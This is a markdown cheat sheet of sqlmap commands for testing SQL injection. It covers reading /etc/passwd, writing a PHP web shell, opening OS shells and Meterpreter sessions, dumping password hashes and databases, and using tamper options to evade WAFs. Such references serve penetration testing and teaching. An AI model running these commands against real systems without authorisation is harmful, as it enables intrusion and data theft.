# SQLMap Cheat Sheet

## Basic Usage
```bash
# Test a URL parameter
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data "user=admin&pass=123"

# Request from file (Burp request)
sqlmap -r request.txt

# Using cookie
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"
```

## Enumeration
| Command | Description |
|---------|-------------|
| `--banner` | Database banner |
| `--current-user` | Current DB user |
| `--current-db` | Current database |
| `--is-dba` | Check if DBA |
| `--hostname` | DB server hostname |
| `--users` | Enumerate users |
| `--passwords` | Dump password hashes |
| `--privileges` | User privileges |
| `--roles` | DB roles |
| `--dbs` | List databases |
| `--tables -D dbname` | List tables in DB |
| `--columns -T table -D dbname` | List columns |
| `--dump -T table -D dbname` | Dump table data |
| `--dump-all` | Dump everything |
| `--schema` | DB schema |
| `--search -T user` | Search tables named user |
| `--comments` | Find comments in DB |

## Database Takeover
```bash
# Read local files
sqlmap -u "url" --file-read="/etc/passwd"

# Write shell
sqlmap -u "url" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# OS shell
sqlmap -u "url" --os-shell

# SQL shell
sqlmap -u "url" --sql-shell

# Meterpreter
sqlmap -u "url" --os-pwn
```

## Database-Specific Options
| Flag | Description |
|------|-------------|
| `--dbms=mysql` | Force MySQL |
| `--dbms=mssql` | Force MSSQL |
| `--dbms=oracle` | Force Oracle |
| `--dbms=postgresql` | Force PostgreSQL |
| `--dbms=sqlite` | Force SQLite |

## Bypass Techniques
| Flag | Description |
|------|-------------|
| `--level=5` | Max level (cookies, headers) |
| `--risk=3` | Max risk (heavy DB operations) |
| `--skip-waf` | Skip WAF detection |
| `--tamper=space2comment` | Bypass WAF/IDS |
| `--tamper=between` | Replace > with NOT BETWEEN |
| `--tamper=randomcase` | Random case |
| `--tamper=charencode` | URL encode |
| `--tamper=charunicodeencode` | Unicode encode |
| `--random-agent` | Random user-agent |
| `--user-agent="Mozilla/5.0"` | Custom user-agent |
| `--headers="X-Forwarded-For: 127.0.0.1"` | Custom headers |
| `--drop-set-cookie` | Ignore Set-Cookie |
| `--disable-casting` | Disable type casting |
| `--param-del=";"` | Parameter delimiter |
| `--not-string="Invalid"` | String not in response |
| `--string="Valid"` | String must be in response |
| `--code=200` | Force HTTP code |

## Tamper Scripts (Common)
| Script | Effect |
|--------|--------|
| `space2comment` | `SELECT` -> `SELECT/**/` |
| `between` | `> 1` -> `NOT BETWEEN 0 AND 1` |
| `equaltolike` | `=` -> `LIKE` |
| `greatest` | `> 1` -> `GREATEST(1,1+1)` |
| `ifnull2casewhen` | IFNULL -> CASE WHEN |
| `modsecurityversioned` | Versioned comments |
| `modsecurityzeroversioned` | Zero-version comment |
| `apostrophemaskencode` | Mask apostrophe |
| `percentage` | `SELECT` -> `%S%EL%ECT` |
| `randomcase` | Random letter case |
| `charencode` | URL encode chars |

## Performance
| Flag | Description |
|------|-------------|
| `--threads=10` | Max threads |
| `--batch` | Default answers (non-interactive) |
| `--smart` | Only test when heuristic shows |
| `--answers="ext=N"` | Pre-answer questions |
| `--time-sec=3` | Timeout for time-based |
| `--retries=3` | Connection retries |
| `--timeout=30` | Connection timeout |
| `--delay=2` | Delay between requests |
| `--safe-url` | Safe URL to visit between tests |
| `--safe-freq=3` | Request safe URL every N reqs |

## Output Options
| Flag | Description |
|------|-------------|
| `-o output` | Output directory |
| `--flush-session` | Clear session file |
| `--fresh-queries` | Ignore session |
| `--eta` | Time estimation |
| `--mobile` | Mobile user-agent |
| `--purge-output` | Clean output dir |
| `--update` | Update SQLMap |

## Examples
```bash
# Basic injection + dump
sqlmap -u "http://target.com?id=1" --dbs --batch

# POST with data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test&submit=Login" --dbs

# Using Burp request file
sqlmap -r /tmp/request.txt --level=5 --risk=3 --tamper=space2comment

# Privilege escalation
sqlmap -u "http://target.com?id=1" --is-dba --os-shell

# Full dump with bypass
sqlmap -u "http://target.com?id=1" --level=5 --risk=3 --dump-all --batch --tamper=between,randomcase
```
